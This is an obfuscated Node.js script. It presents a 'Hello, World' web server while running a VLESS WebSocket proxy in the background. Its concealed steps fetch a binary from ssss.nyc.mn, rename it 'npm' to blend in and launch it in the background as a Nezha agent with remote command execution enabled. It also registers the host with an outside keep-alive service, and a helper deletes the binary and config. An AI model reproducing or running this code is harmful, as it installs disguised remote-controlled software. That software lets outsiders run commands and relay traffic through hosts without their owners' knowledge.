function _0x1c44(_0x318cfe,_0x2b55f){const _0x3ab9d7=_0x3ab9();return _0x1c44=function(_0x1c44b6,_0x285755){_0x1c44b6=_0x1c44b6-0x14f;let _0x1fbeec=_0x3ab9d7[_0x1c44b6];return _0x1fbeec;},_0x1c44(_0x318cfe,_0x2b55f);}const _0x113ec6=_0x1c44;(function(_0x3a17d1,_0x55c2c9){const _0x4431e3=_0x1c44,_0x382a42=_0x3a17d1();while(!![]){try{const _0x201d1a=parseInt(_0x4431e3(0x181))/0x1+parseInt(_0x4431e3(0x159))/0x2+parseInt(_0x4431e3(0x174))/0x3*(parseInt(_0x4431e3(0x196))/0x4)+-parseInt(_0x4431e3(0x16b))/0x5+-parseInt(_0x4431e3(0x162))/0x6+-parseInt(_0x4431e3(0x15c))/0x7+parseInt(_0x4431e3(0x189))/0x8;if(_0x201d1a===_0x55c2c9)break;else _0x382a42['push'](_0x382a42['shift']());}catch(_0x4aa1e5){_0x382a42['push'](_0x382a42['shift']());}}}(_0x3ab9,0x6ad24));const os=require('os'),http=require(_0x113ec6(0x18b)),fs=require('fs'),axios=require(_0x113ec6(0x17e)),net=require(_0x113ec6(0x157)),{Buffer}=require(_0x113ec6(0x16f)),{exec,execSync}=require(_0x113ec6(0x1ab)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x113ec6(0x1ad)][_0x113ec6(0x19d)]||_0x113ec6(0x186),NEZHA_SERVER=process[_0x113ec6(0x1ad)][_0x113ec6(0x16a)]||'',NEZHA_PORT=process[_0x113ec6(0x1ad)][_0x113ec6(0x195)]||'',NEZHA_KEY=process[_0x113ec6(0x1ad)][_0x113ec6(0x193)]||'',DOMAIN=process[_0x113ec6(0x1ad)][_0x113ec6(0x177)]||_0x113ec6(0x19b),AUTO_ACCESS=process[_0x113ec6(0x1ad)][_0x113ec6(0x1ae)]||!![],SUB_PATH=process[_0x113ec6(0x1ad)][_0x113ec6(0x16c)]||'sub',NAME=process['env'][_0x113ec6(0x19e)]||_0x113ec6(0x1ac),PORT=process[_0x113ec6(0x1ad)]['PORT']||0xbb8,metaInfo=execSync(_0x113ec6(0x191),{'encoding':_0x113ec6(0x188)}),ISP=metaInfo['trim'](),httpServer=http[_0x113ec6(0x17b)]((_0x4d6896,_0x5dbf70)=>{const _0x2c7eb1=_0x113ec6;if(_0x4d6896[_0x2c7eb1(0x160)]==='/')_0x5dbf70[_0x2c7eb1(0x1a9)](0xc8,{'Content-Type':_0x2c7eb1(0x176)}),_0x5dbf70['end'](_0x2c7eb1(0x151));else{if(_0x4d6896['url']==='/'+SUB_PATH){const _0x23d1d5=_0x2c7eb1(0x167)+UUID+_0x2c7eb1(0x1a8)+DOMAIN+_0x2c7eb1(0x1b4)+DOMAIN+'&path=%2F#'+NAME+'-'+ISP,_0x35b5ed=Buffer[_0x2c7eb1(0x163)](_0x23d1d5)[_0x2c7eb1(0x18c)](_0x2c7eb1(0x19f));_0x5dbf70[_0x2c7eb1(0x1a9)](0xc8,{'Content-Type':_0x2c7eb1(0x176)}),_0x5dbf70[_0x2c7eb1(0x171)](_0x35b5ed+'\x0a');}else _0x5dbf70['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x5dbf70[_0x2c7eb1(0x171)](_0x2c7eb1(0x1a2));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x113ec6(0x18a)](/-/g,'');wss['on'](_0x113ec6(0x17f),_0x58c239=>{const _0x4a25b6=_0x113ec6;_0x58c239[_0x4a25b6(0x19c)](_0x4a25b6(0x199),_0x17038d=>{const _0x50f429=_0x4a25b6,[_0x406a91]=_0x17038d,_0xbe87a7=_0x17038d[_0x50f429(0x1b1)](0x1,0x11);if(!_0xbe87a7[_0x50f429(0x1b3)]((_0x45f236,_0x409780)=>_0x45f236==parseInt(uuid[_0x50f429(0x182)](_0x409780*0x2,0x2),0x10)))return;let _0x19d444=_0x17038d['slice'](0x11,0x12)[_0x50f429(0x15e)]()+0x13;const _0x2b2ab1=_0x17038d[_0x50f429(0x1b1)](_0x19d444,_0x19d444+=0x2)[_0x50f429(0x18f)](0x0),_0x535b09=_0x17038d['slice'](_0x19d444,_0x19d444+=0x1)[_0x50f429(0x15e)](),_0x4b4436=_0x535b09==0x1?_0x17038d['slice'](_0x19d444,_0x19d444+=0x4)[_0x50f429(0x158)]('.'):_0x535b09==0x2?new TextDecoder()[_0x50f429(0x187)](_0x17038d[_0x50f429(0x1b1)](_0x19d444+0x1,_0x19d444+=0x1+_0x17038d['slice'](_0x19d444,_0x19d444+0x1)['readUInt8']())):_0x535b09==0x3?_0x17038d[_0x50f429(0x1b1)](_0x19d444,_0x19d444+=0x10)[_0x50f429(0x153)]((_0x594bc4,_0x2206d5,_0x3d97a7,_0xb20f75)=>_0x3d97a7%0x2?_0x594bc4[_0x50f429(0x164)](_0xb20f75[_0x50f429(0x1b1)](_0x3d97a7-0x1,_0x3d97a7+0x1)):_0x594bc4,[])[_0x50f429(0x18d)](_0x58ce10=>_0x58ce10[_0x50f429(0x18f)](0x0)['toString'](0x10))['join'](':'):'';_0x58c239[_0x50f429(0x183)](new Uint8Array([_0x406a91,0x0]));const _0xe55a85=createWebSocketStream(_0x58c239);net['connect']({'host':_0x4b4436,'port':_0x2b2ab1},function(){const _0xcc3744=_0x50f429;this[_0xcc3744(0x190)](_0x17038d['slice'](_0x19d444)),_0xe55a85['on'](_0xcc3744(0x185),()=>{})[_0xcc3744(0x17c)](this)['on']('error',()=>{})[_0xcc3744(0x17c)](_0xe55a85);})['on'](_0x50f429(0x185),()=>{});})['on'](_0x4a25b6(0x185),()=>{});});const getDownloadUrl=()=>{const _0x2e6038=_0x113ec6,_0x3a4d38=os['arch']();return _0x3a4d38===_0x2e6038(0x152)||_0x3a4d38==='arm64'||_0x3a4d38===_0x2e6038(0x16e)?!NEZHA_PORT?_0x2e6038(0x1a1):_0x2e6038(0x1b0):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x374b4f=_0x113ec6;try{const _0x401b47=getDownloadUrl(),_0x413163=await axios({'method':_0x374b4f(0x1af),'url':_0x401b47,'responseType':_0x374b4f(0x155)}),_0x4e3d43=fs['createWriteStream']('npm');return _0x413163[_0x374b4f(0x17a)][_0x374b4f(0x17c)](_0x4e3d43),new Promise((_0x3f4aea,_0x31e26d)=>{const _0x407162=_0x374b4f;_0x4e3d43['on'](_0x407162(0x197),()=>{const _0x259c58=_0x407162;console[_0x259c58(0x15d)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20./npm',_0x374712=>{if(_0x374712)_0x31e26d(_0x374712);_0x3f4aea();});}),_0x4e3d43['on'](_0x407162(0x185),_0x31e26d);});}catch(_0x1879e6){throw _0x1879e6;}},runnz=async()=>{const _0x2a91b2=_0x113ec6;await downloadFile();let _0x526924='',_0xae2b4f='';console[_0x2a91b2(0x15d)](_0x2a91b2(0x19a)+NEZHA_SERVER);const _0x47bc1a=()=>{const _0x28a72a=_0x2a91b2;try{const _0x36bf44=execSync(_0x28a72a(0x150))[_0x28a72a(0x18c)]();return _0x36bf44[_0x28a72a(0x161)]>0x0;}catch(_0x106b16){return![];}};if(_0x47bc1a()){console['log']('npm\x20is\x20already\x20running');return;}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3e401d=['443',_0x2a91b2(0x166),_0x2a91b2(0x15a),_0x2a91b2(0x184),_0x2a91b2(0x169),_0x2a91b2(0x17d)];_0x526924=_0x3e401d[_0x2a91b2(0x194)](NEZHA_PORT)?_0x2a91b2(0x1a5):'',_0xae2b4f=_0x2a91b2(0x179)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2a91b2(0x1a3)+NEZHA_KEY+'\x20'+_0x526924+_0x2a91b2(0x154);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1e4e21=NEZHA_SERVER[_0x2a91b2(0x194)](':')?NEZHA_SERVER[_0x2a91b2(0x170)](':')[_0x2a91b2(0x173)]():'',_0x3002df=new Set([_0x2a91b2(0x16d),_0x2a91b2(0x166),'2096','2087',_0x2a91b2(0x169),_0x2a91b2(0x17d)]),_0x6394d=_0x3002df[_0x2a91b2(0x15f)](_0x1e4e21)?'true':_0x2a91b2(0x156),_0x12e281=_0x2a91b2(0x15b)+NEZHA_KEY+_0x2a91b2(0x165)+NEZHA_SERVER+_0x2a91b2(0x1b5)+_0x6394d+_0x2a91b2(0x1a0)+UUID;!fs[_0x2a91b2(0x172)](_0x2a91b2(0x175))&&fs[_0x2a91b2(0x198)](_0x2a91b2(0x175),_0x12e281);}_0xae2b4f=_0x2a91b2(0x1a7);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0xae2b4f,{'shell':'/bin/bash'}),console['log'](_0x2a91b2(0x14f));}catch(_0x3a4922){console[_0x2a91b2(0x185)]('npm\x20running\x20error:\x20'+_0x3a4922);}};async function addAccessTask(){const _0x4bcc56=_0x113ec6;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console[_0x4bcc56(0x15d)]('URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task');return;}else{const _0xb154cc=_0x4bcc56(0x1a4)+DOMAIN,_0x11d7da=_0x4bcc56(0x1a6)+_0xb154cc+_0x4bcc56(0x1b2);exec(_0x11d7da,(_0x1dc38d,_0xe830a1,_0x5d5b64)=>{const _0x288f44=_0x4bcc56;if(_0x1dc38d){console['error'](_0x288f44(0x192),_0x1dc38d[_0x288f44(0x199)]);return;}console['log'](_0x288f44(0x18e),_0xe830a1);});}}catch(_0x1e355e){console[_0x4bcc56(0x185)](_0x4bcc56(0x1aa),_0x1e355e[_0x4bcc56(0x199)]);}}function _0x3ab9(){const _0x118a97=['every','&type=ws&host=','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','npm\x20is\x20running','ps\x20aux\x20|\x20grep\x20\x22npm\x22\x20|\x20grep\x20-v\x20\x22grep\x22','Hello,\x20World\x0a','arm','reduce','\x20>/dev/null\x202>&1\x20&','stream','false','net','join','259602hXjNmW','2096','\x0aclient_secret:\x20','529557yXUFWB','log','readUInt8','has','url','length','3724392ZVUNbI','from','concat','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','8443','vless://','npm','2083','NEZHA_SERVER','3945455Eopqyo','SUB_PATH','443','aarch64','buffer','split','end','existsSync','pop','717cvUPAa','config.yaml','text/plain','DOMAIN','unlink','nohup\x20./npm\x20-s\x20','data','createServer','pipe','2053','axios','connection','Server\x20is\x20running\x20on\x20port\x20','84257luWIah','substr','send','2087','error','de04add9-5c68-6bab-950c-08cd5320df33','decode','utf-8','11107656JEOLwI','replace','http','toString','map','Automatic\x20Access\x20Task\x20added\x20successfully:','readUInt16BE','write','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Error\x20sending\x20request:','NEZHA_KEY','includes','NEZHA_PORT','5364WUncWp','finish','writeFileSync','message','NEZHA_SERVER:\x20','1234.abc.com','once','UUID','NAME','base64','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://arm64.ssss.nyc.mn/v1','Not\x20Found\x0a','\x20-p\x20','https://','--tls','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','@www.visa.com.tw:443?encryption=none&security=tls&sni=','writeHead','Error\x20added\x20Task:','child_process','Vls','env','AUTO_ACCESS','get','https://arm64.ssss.nyc.mn/agent','slice','\x22}\x27'];_0x3ab9=function(){return _0x118a97;};return _0x3ab9();}const delFiles=()=>{const _0x445b50=_0x113ec6;fs[_0x445b50(0x178)](_0x445b50(0x168),()=>{}),fs['unlink'](_0x445b50(0x175),()=>{});};httpServer['listen'](PORT,()=>{const _0x3a09a5=_0x113ec6;runnz(),addAccessTask(),console[_0x3a09a5(0x15d)](_0x3a09a5(0x180)+PORT);});
